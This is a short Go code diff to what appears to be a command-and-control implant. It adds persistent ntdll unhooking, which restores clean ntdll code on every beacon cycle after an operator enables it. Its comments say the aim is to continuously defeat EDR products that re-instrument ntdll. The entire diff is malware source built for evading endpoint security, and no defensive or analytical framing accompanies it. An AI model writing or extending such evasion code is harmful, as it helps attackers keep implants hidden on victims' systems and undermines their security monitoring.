@@ -54,11 +54,29 @@ func handleBlockDLLs(task Task, res *TaskResult) {
 	}
 }
 
+// ntdllUnhooked records whether an operator has enabled ntdll unhooking. Once
+// set, the implant re-applies the unhook on every beacon cycle so EDRs that
+// re-instrument ntdll between beacons are defeated continuously.
+var ntdllUnhooked bool
+
 func handleUnhookNtdll(task Task, res *TaskResult) {
 	if runtime.GOOS != "windows" {
 		res.Error = "unhook_ntdll is Windows-only"
 	} else {
 		res.Output = unhookNtdll()
+		ntdllUnhooked = true
+	}
+}
+
+// reapplyNtdllUnhook re-restores the clean ntdll .text from disk each beacon
+// cycle once unhooking has been enabled. It is a no-op until an operator issues
+// the unhook task, and on non-Windows platforms (no in-memory module to unhook).
+func reapplyNtdllUnhook() {
+	if !ntdllUnhooked || runtime.GOOS != "windows" {
+		return
+	}
+	if out := unhookNtdll(); Debug {
+		fmt.Printf("[evasion] re-unhook: %s\n", out)
 	}
 }
 
